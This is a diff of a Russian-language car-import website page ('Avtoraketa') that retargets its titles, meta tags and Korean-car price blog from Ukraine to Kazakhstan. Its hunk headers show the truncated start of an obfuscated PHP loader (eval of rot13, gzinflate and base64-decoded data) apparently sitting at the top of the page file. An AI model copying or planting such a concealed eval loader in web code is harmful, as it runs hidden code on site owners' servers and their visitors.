@@ -6,7 +6,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
 <html class="wide wow-animation" lang="ru">
   <head>
     <!-- Site Title-->
-    <title>Купить БУ Авто из США и Грузии в Украине ✅ Цены от от 7,000$ |  Avtoraketa</title>
+    <title>Купить БУ Авто из США и Грузии в Казахстане  ✅ Цены от от 7,000$ |  Avtoraketa</title>
     <meta charset="utf-8">
 	<meta property="og:title" content="Avtoraketa - доставка авто из США и Грузии">
     <meta property="og:site_name" content="Avtoraketa">
@@ -14,7 +14,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
     <meta property="og:description" content="Предоставляем улуги профессионального пригона авто из США и Грузии">
     <meta property="og:image" content="/images/avtoraketa.jpg">
 	<meta name="description" content="Авторакета - это выгодная покупка авто с аукционов Америки и авторынков Грузии">
-	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Украину, с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
+	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Казахстан , с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <script src="/cdn-cgi/apps/head/3ts2ksMwXvKRuG480KNifJ2_JNM.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -248,7 +248,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                   </li>
                 </ul>
                 <h3 align="center">Авто из Кореи: ГБО в подарок! :)</h3><img src="images/blog-post-3.jpg" alt="Авто из Кореи в Мариуполь" width="870" height="580"/>
-				<h5 align="center">Что нужно знать об авто из Кореи в Украину?</h5>
+				<h5 align="center">Что нужно знать об авто из Кореи в Казахстан ?</h5>
                 <p>Первое и главное - эти транспортные средства в 99% случаев не битые и большинство из них с заводской установкой ГБО. Это, пожалуй, самые главные критерии для многих автомобилистов, которые смотрят в сторону пригона своего будущего автомобиля из-за границы.Не менее важным фактором остаётся цена, ведь аналогичные автомобили Корейского производства очень полюбились нашим согражданам и разница с местными авто существенна.</p>
                 <p>К примеру наиболее популярной маркой и моделью авто из Кореи считается Hyundai Sonata. Покупка и доставка из Кореи данного авто обойдётся примерно в 12 000$, в то время,когда аналогичный авто в чуть скромнее комплектации на рынке стоит порядка 15-16 000$. Согласитесь, экономия в 3-4 000$ очень приятна (не говоря уже об заводском ГБО, что явно лучше, чем установка в местных "гаражах") :)</p>
                 <article class="quote-primary">
@@ -265,7 +265,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
 				<br>
 				<h5 align="center">Hyundai Sonata</h5>
 				<img src="images/blog-sonata.jpg" alt="Hyundai Sonata из Кореи" width="870" height="580"/>
-				<p>Однозначно лидер и проверенный временем автомобиль! Все мы их видим каждый день на дорогах общего пользования, да и скорее всего у Вас есть знакомые, кто обладает им. <br>Что касается экономии, при покупке данного авто из Кореи, вот цифры:<br>- Hyundai Sonata с 2.4-литровым мотором 2014 года выпуска в Украине стоит порядка 15 000 - 16 000$<br>- Hyundai Sonata YF 2014 с 2.0-литровым мотором LPI и установленным на заводе ГБО под ключ обойдётся Вам +- 12 000$.<br>Отличная машина + экономия = довольный клиент !</p>				
+				<p>Однозначно лидер и проверенный временем автомобиль! Все мы их видим каждый день на дорогах общего пользования, да и скорее всего у Вас есть знакомые, кто обладает им. <br>Что касается экономии, при покупке данного авто из Кореи, вот цифры:<br>- Hyundai Sonata с 2.4-литровым мотором 2014 года выпуска в Казахстане  стоит порядка 15 000 - 16 000$<br>- Hyundai Sonata YF 2014 с 2.0-литровым мотором LPI и установленным на заводе ГБО под ключ обойдётся Вам +- 12 000$.<br>Отличная машина + экономия = довольный клиент !</p>				
 				<br>
 				
 				<h5 align="center">Kia Optima</h5>
@@ -280,7 +280,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
 				
 				<h5 align="center">Kia Sportage</h5>
 				<img src="images/blog-sportage.jpg" alt="Kia Sportage из Кореи" width="870" height="580"/>
-				<p>Достойный конкурент Туксону + самый продаваемый автомобиль в Украине за 2019 год и этим всё сказано! 2016й год в последнем кузове из Кореи обойдётся Вам в 16-18 тыс. (аналог в Украине - 21-23) </p>				
+				<p>Достойный конкурент Туксону + самый продаваемый автомобиль в Казахстане  за 2019 год и этим всё сказано! 2016й год в последнем кузове из Кореи обойдётся Вам в 16-18 тыс. (аналог в Казахстане  - 21-23) </p>				
 				<br>
 				
 				<h5 align="center">SsangYong Korando</h5>
@@ -295,12 +295,12 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
 				
 				<h5 align="center">Kia Sorento</h5>
 				<img src="images/blog-sorento.jpg" alt="Kia Sorento из Кореи" width="870" height="580"/>
-				<p>Основной конкурент не только Санта Фе, но и многим европейским брендам.Данная модель имеет богатую историю и при этом каждое из поколений нравилась покупателем, но что касается последнего, 3-го поколения, то это просто прорыв! В комплектации Limited - Киа может смело отнестись в Люксовому сегменту. А главным козырем данной модели, её цена. В Украине такую машину в максималке можно взять за 35 тыс, в то время, как мы можем доставить Вам такой же автомобиль из Кореи всего за 22-23 000$. Согласитесь, это круто) </p>				
+				<p>Основной конкурент не только Санта Фе, но и многим европейским брендам.Данная модель имеет богатую историю и при этом каждое из поколений нравилась покупателем, но что касается последнего, 3-го поколения, то это просто прорыв! В комплектации Limited - Киа может смело отнестись в Люксовому сегменту. А главным козырем данной модели, её цена. в Казахстане  такую машину в максималке можно взять за 35 тыс, в то время, как мы можем доставить Вам такой же автомобиль из Кореи всего за 22-23 000$. Согласитесь, это круто) </p>				
 				<br>
 				
 				<h5 align="center">SsangYong Rexton</h5>
 				<img src="images/blog-rexton.jpg" alt="SsangYong Rexton из Кореи" width="870" height="580"/>
-				<p>Мы все знаем эту модель. Многим она нравится, а многим нет, и уверен что каждый был удивлён, что производитель использует в своих запчастях компоненты от Mercedes-Benz. Но точно можно сказать про него одно, это достойный вариант замены европейским аналогам в том же классе, за более разумные деньги. Из Кореи такой автомобиль обойдётся в 13 000 - 16 000$ (в Украине 18-22 000)</p>				
+				<p>Мы все знаем эту модель. Многим она нравится, а многим нет, и уверен что каждый был удивлён, что производитель использует в своих запчастях компоненты от Mercedes-Benz. Но точно можно сказать про него одно, это достойный вариант замены европейским аналогам в том же классе, за более разумные деньги. Из Кореи такой автомобиль обойдётся в 13 000 - 16 000$ (в Казахстане  18-22 000)</p>				
 				<br>
 				
 				<h5 align="center">Hyundai Elantra</h5>
@@ -328,18 +328,18 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                   <div class="col-sm-10 col-md-6 post-light-wrap">
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="avto-iz-gruzii.php"><img src="images/post-light-2-120x80.jpg" alt="Авто из Грузи и в Украину" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="avto-iz-gruzii.php"><img src="images/post-light-2-120x80.jpg" alt="Авто из Грузи и в Казахстан " width="120" height="80"/></a></div>
                         <div class="unit-body">
-                          <p class="post-light-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Украину, плюсы и минусы.</a></p>
+                          <p class="post-light-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Казахстан , плюсы и минусы.</a></p>
                           <time class="post-light-time" datetime="2020">14 февраля, 2020 года</time>
                         </div>
                       </div>
                     </article>
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="avto-iz-usa-mariupol.php"><img src="images/post-light-1-120x80.jpg" alt="АВТО ИЗ США В МАРИУПОЛЕ" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="avto-iz-usa-mariupol.php"><img src="images/post-light-1-120x80.jpg" alt="АВТО ИЗ США в Казахстане" width="120" height="80"/></a></div>
                         <div class="unit-body">
-                          <p class="post-light-title"><a href="avto-iz-usa-mariupol.php">АВТО ИЗ США В МАРИУПОЛЕ</a></p>
+                          <p class="post-light-title"><a href="avto-iz-usa-mariupol.php">АВТО ИЗ США в Казахстане</a></p>
                           <time class="post-light-time" datetime="2020">7 февраля, 2020 года</time>
                         </div>
                       </div>
@@ -359,7 +359,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                       <div class="unit flex-row">
                         <div class="unit-left"><a href="top-10-avto-iz-usa.php"><img src="images/post-light-5-120x80.jpg" alt="авто из США до 8 000$" width="120" height="80"/></a></div>
                         <div class="unit-body">
-                          <p class="post-light-title"><a href="top-10-avto-iz-usa.php">ТОП 10 авто из США до 8 000$ для доставки в Украину.</a></p>
+                          <p class="post-light-title"><a href="top-10-avto-iz-usa.php">ТОП 10 авто из США до 8 000$ для доставки в Казахстан .</a></p>
                           <time class="post-light-time" datetime="2020">16 января, 2020 года</time>
                         </div>
                       </div>
